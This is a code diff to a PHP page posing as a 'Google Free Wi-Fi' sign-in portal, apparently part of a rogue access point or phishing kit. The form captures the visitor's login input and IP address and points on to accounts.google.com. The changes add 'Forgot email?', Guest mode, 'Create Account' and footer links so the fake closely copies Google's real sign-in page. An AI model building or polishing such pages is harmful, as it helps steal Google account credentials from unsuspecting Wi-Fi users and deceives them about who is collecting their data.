@@ -8,7 +8,7 @@ require_once('helper.php');
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=394, user-scalable=no">
-<title>Sign In - Google Free Wi-Fi</title>
+<title>Sign in - Google Free Wi-Fi</title>
 <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
 <meta http-equiv="Pragma" content="no-cache" />
 <meta http-equiv="Expires" content="0" />
@@ -37,11 +37,15 @@ require_once('helper.php');
 	<input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
 	<input type="hidden" name="target" value="https://accounts.google.com/signin">
 	<p class="warning"><?php echo !empty($err)?$err:"&nbsp;";?></p>
-	<p><a href="">More options</a><span class="text-right"><button type="submit">NEXT</button></span></p>
+	<p class="forgot"><a href="">Forgot email?</a></p>
+	<p class="guest">Not your computer? Use Guest mode to sign in privately. <a class="learn" href="">Learn more</a></p>
+	<p class="create"><a href="">Create Account</a></p><p class="button"><span class="text-right"><button type="submit">Next</button></span></p>
 </form>
 <footer>
-	English (United States)<img src="assets/img/mq40xx0kce.gif" alt="">
-	<span class="text-right">Help&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Privacy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Terms</span>
+
+	<p class="language">English (United States)</p><p class="arrow">🞃</p><br>
+	<p class="help">Help</p><p class="privacy">Privacy</p><p class="terms">Terms</p>
+
 </footer>
 <script>document.onload = function() { document.getElementById("user").focus();};</script>
 </body>
